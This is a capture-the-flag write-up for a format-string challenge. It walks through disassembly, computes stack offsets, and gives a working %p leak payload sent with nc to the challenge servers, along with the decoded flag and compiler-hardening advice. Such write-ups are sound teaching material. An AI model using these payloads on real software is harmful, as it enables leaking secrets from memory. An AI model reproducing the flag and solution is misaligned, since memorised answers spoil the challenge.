# Leaky Logger — Writeup

- **Category:** Pwn (format string)
- **Points:** 10
- **Flag:** `rstcon{f0rmat_str1ngs_l3ak_the_stack}`
- **Description:** *The RST Hydro event logger reads the flag into memory at
  startup, then offers to record one log line for you. It echoes that line back a
  little too literally.*
- **Target:** `nc 18.215.143.250 9002` (Mirror 2: `nc 18.145.136.91 9002`)
- **Provided:** `logger` (x86-64 ELF, dynamically linked, not stripped)

## TL;DR

The logger prints your log line with `printf(user_line)` — **no format string** —
so the line is interpreted as a `printf` format. That's a classic **format-string
vulnerability**. The flag was slurped into an 80-byte *stack* buffer at startup,
so it is sitting on the stack inline. `%p` dumps leak it directly; the flag lives
at positional args `%70$`–`%74$`.

## Recon

`strings` gives the whole plot away:

```
flag.txt
flag.txt missing on the server, tell an organizer.
flag.txt unreadable, tell an organizer.
RST Hydro event logger.
Submit one log line and it will be recorded:
logged:
printf
```

Disassembling `main` (`objdump -d -M intel`) confirms the layout and the bug:

```asm
; --- startup: read flag.txt into a stack buffer ---
call   fopen            ; fopen("flag.txt","r")  -> [rbp-0x8]
lea    rax,[rbp-0x60]
mov    edx,0x50
call   memset           ; zero an 80-byte buffer at [rbp-0x60]
lea    rax,[rbp-0x60]
mov    esi,0x50
call   fgets            ; fgets(flagbuf, 0x50, f)  <-- FLAG lands at [rbp-0x60]
call   fclose
call   strcspn          ; strip trailing '\n'

; --- read our log line ---
lea    rax,[rbp-0x260]
mov    esi,0x200
call   fgets            ; fgets(line, 0x200, stdin)   line at [rbp-0x260] == rsp
call   strcspn          ; strip '\n'

; --- echo it back "a little too literally" ---
lea    rax,[rip+...]    ; "logged: "
call   printf           ; printf("logged: ")      <- harmless, has a format
lea    rax,[rbp-0x260]
mov    rdi,rax
mov    eax,0x0
call   printf           ; printf(line)            <-- VULN: user data as format
```

## The vulnerability

The second `printf` passes our input as the **format string**:

```c
printf(line);     // should have been printf("%s", line);
```

Any conversion specifier we put in `line` is evaluated by `printf`, reading
`printf`'s "arguments" straight off the stack/registers. Because the flag was
read into a **stack** buffer (`[rbp-0x60]`), it is literally one of those stack
values — no arbitrary-read `%s` needed, a plain `%p` dump exposes it as inline
bytes.

## Finding the offset

On x86-64 SysV, `printf`'s first five variadic args come from registers
(`rsi,rdx,rcx,r8,r9`), so stack-passed args begin at positional `%6$`. The frame
is `sub rsp,0x260`, and our format string is at `[rbp-0x260] == rsp`, so:

```
%6$   -> qword at rsp+0x000  = start of our input buffer
%N$   -> qword at rsp+8*(N-6)
flag  -> [rbp-0x60] = rsp+0x200 = rsp + 8*64   ->  N = 6 + 64 = %70$
```

Dumping `%6$p`–`%95$p` and decoding each qword little-endian shows the flag bytes
appear exactly where predicted:

```
$ printf '%%70$p %%71$p %%72$p %%73$p %%74$p\n' | nc 18.215.143.250 9002
logged: 0x667b6e6f63747372 0x74735f74616d7230 0x336c5f73676e3172 0x735f6568745f6b61 0x7d6b636174
```

Decoding little-endian:

| qword | bytes |
|-------|-------|
| `0x667b6e6f63747372` | `rstcon{f` |
| `0x74735f74616d7230` | `0rmat_st` |
| `0x336c5f73676e3172` | `r1ngs_l3` |
| `0x735f6568745f6b61` | `ak_the_s` |
| `0x7d6b636174`       | `tack}`    |

## Exploit

One-shot:

```bash
printf '%%70$p %%71$p %%72$p %%73$p %%74$p\n' | nc 18.215.143.250 9002
```

Or run the solver (connects, dumps a range, decodes, prints the flag):

```bash
./solves/leaky-logger/solve.py 18.215.143.250 9002
```

## Flag

```
rstcon{f0rmat_str1ngs_l3ak_the_stack}
```

## Takeaway

**Never pass untrusted data as a format string.** `printf(user)` must be
`printf("%s", user)` (or `fputs(user, stdout)`). The bug is trivially caught:
compile with `-Wformat -Wformat-security` (and `-Werror=format-security`), which
flags a non-literal format argument. Secrets held on the stack make it worse —
even without a write primitive, a read-only `%p`/`%x` dump walks them straight
out of memory.
